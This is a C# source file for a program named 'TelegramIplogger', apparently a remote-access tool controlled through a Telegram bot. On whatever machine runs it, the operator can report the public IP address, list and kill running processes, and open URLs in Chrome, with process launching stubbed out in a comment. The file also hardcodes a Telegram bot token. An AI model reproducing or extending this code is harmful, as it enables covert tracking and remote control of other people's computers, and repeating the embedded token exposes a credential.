using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Threading;
using System.Threading.Channels;
using System.Threading.Tasks;
using Telegram.Bot;
using Telegram.Bot.Extensions.Polling;
using Telegram.Bot.Types;
using Telegram.Bot.Types.Enums;

namespace TelegramIplogger
{
    abstract class IComands
    {
        internal bool CheckHostName(string hostName, string message)
        {
            if (message == hostName)
                return true;

            return false;
        }
        
        public abstract Task Execute(ITelegramBotClient botClient, Message message, string hostName);
    }

    class GetProcces : IComands
    {
        public override Task Execute(ITelegramBotClient botClient, Message message, string hostName)
        {
            var messageArr = message.Text.Split(" ");
            
            if(messageArr[1] != hostName)
                return Task.CompletedTask;
            
            Process[] processes = Process.GetProcesses();
            
            HashSet<string> hashSet = new();
            
            foreach (var item in processes)
            {
                hashSet.Add(item.ProcessName);
            }

            string resultText = "";
            
            foreach (var item in hashSet)
            {
                resultText += item + "\n";
            }
            
            botClient.SendTextMessageAsync(message.Chat, resultText);
            
            return Task.CompletedTask;
        }
    }

    class OpenUrl : IComands
    {
        public override Task Execute(ITelegramBotClient botClient, Message message, string hostName)
        {
            var messageSplit = message.Text.Split(" ");
            
            if(!CheckHostName(hostName, messageSplit[1]))
                return Task.CompletedTask;

            Process.Start("C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe", messageSplit[2]);
            
            return Task.CompletedTask;
        }
    }

    class OpenProccess : IComands
    {
        public override Task Execute(ITelegramBotClient botClient, Message message, string hostName)
        {
            /*var messageArr = message.Text.Split(" ");
            
            if(messageArr.Length <= 1)
                return Task.CompletedTask;
            
            if(!CheckHostName(hostName, messageArr[1]))
                return Task.CompletedTask;

            try
            {
                Process.Start(messageArr[2], "");
                Console.WriteLine("Open");
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
                return Task.CompletedTask;
            }*/ //TODO
            
            return Task.CompletedTask;
        }
    }

    class KillProccess : IComands
    {
        public override Task Execute(ITelegramBotClient botClient, Message message, string hostName)
        {
            var textSplit = message.Text.Split(" ");

            if (textSplit[1] == hostName)
            {
                foreach (var item in Process.GetProcesses())
                {
                    if (item.ProcessName == textSplit[2])
                    {
                        item.Kill();
                    }
                }
            }
            
            return Task.CompletedTask;
        }
    }
    
    class GetIp : IComands
    {
        public override Task Execute(ITelegramBotClient botClient, Message message, string hostName)
        {
            var messageArr = message.Text.Split(" ");
            
            if (messageArr[1].ToLower() == hostName.ToLower())
            {
                String address = "";  
                WebRequest request = WebRequest.Create("http://checkip.dyndns.org/");  
                using (WebResponse response = request.GetResponse())  
                using (StreamReader stream = new StreamReader(response.GetResponseStream()))  
                {  
                    address = stream.ReadToEnd();  
                }  
  
                int first = address.IndexOf("Address: ") + 9;  
                int last = address.LastIndexOf("</body>");  
                address = address.Substring(first, last - first);

                botClient.SendTextMessageAsync(message.Chat, address);
            }
            
            return Task.CompletedTask;
        }
    }

    class GetAllUsers : IComands
    {
        public override Task Execute(ITelegramBotClient botClient, Message message, string hostName)
        {
            botClient.SendTextMessageAsync(message.Chat, Dns.GetHostName());
            
            return Task.CompletedTask;
        }
    }
    
    class LockCursor : IComands
    {
        private bool isLock = false;
        
        public override async Task Execute(ITelegramBotClient botClient, Message message, string hostName)
        {
            var messageArr = message.Text.Split(" ");
            
            if(!CheckHostName(hostName, messageArr[1]))
                return;

            int time;

            int.TryParse(messageArr[2], out time);

            if (isLock == false)
                await AsyncWait(time);
            
            isLock = !isLock;
        }

        private async Task AsyncWait(int time)
        {
            Stopwatch sw = new();
            
            sw.Start();

            while (sw.ElapsedMilliseconds < time)
            {
                
                await Task.Delay(10);
            }
        }
    }

    class Program
    {
        private TelegramBotClient client;

        private const string token = "5507094218:AAEw8iawhTqyaSjVtwfmAvMHYE9VCO1iS3Q";

        private string hostName = "";

        private Dictionary<string, IComands> Comands = new()
        {
            {"/getip", new GetIp()},
            {"/getallusers", new GetAllUsers()},
            {"/getallprocess", new GetProcces()},
            {"/killprocces", new KillProccess()},
            {"/openurl", new OpenUrl()},
            {"/openprocess", new OpenProccess()},
            {"/lockcursor", new LockCursor()}
        };

        static void Main(string[] args) => new Program().Start().GetAwaiter().GetResult();

        public async Task Start()
        {
            client = new TelegramBotClient(token);

            Console.WriteLine($"Start {client.GetMeAsync().Result.FirstName}");

            Console.WriteLine(Dns.GetHostName());
            
            hostName = Dns.GetHostName();
            
            var cts = new CancellationTokenSource();
            var cancellationToken = cts.Token;
            var receiverOptions = new ReceiverOptions
            {
                AllowedUpdates = { },
            };
            client.StartReceiving(
                HandleUpdateAsync,
                HandleErrorAsync,
                receiverOptions,
                cancellationToken
            );

            Console.ReadLine();
        }

        private async Task HandleUpdateAsync(ITelegramBotClient botClient, Update update, CancellationToken arg3)
        {
            if(update.Type == UpdateType.Message)
            {
                var message = update.Message;

                Console.WriteLine(message.Chat.FirstName + " : " + message.Text);
                
                var messageArr = message.Text.Split(" ");

                if(!Comands.ContainsKey(messageArr[0].ToLower()))
                    return;
                
                await Comands[messageArr[0].ToLower()].Execute(botClient, message, hostName);
            }
        }

        private Task HandleErrorAsync(ITelegramBotClient arg1, Exception arg2, CancellationToken arg3)
        {
            Console.WriteLine(arg2.Message);
            return Task.CompletedTask;
        }
    }
}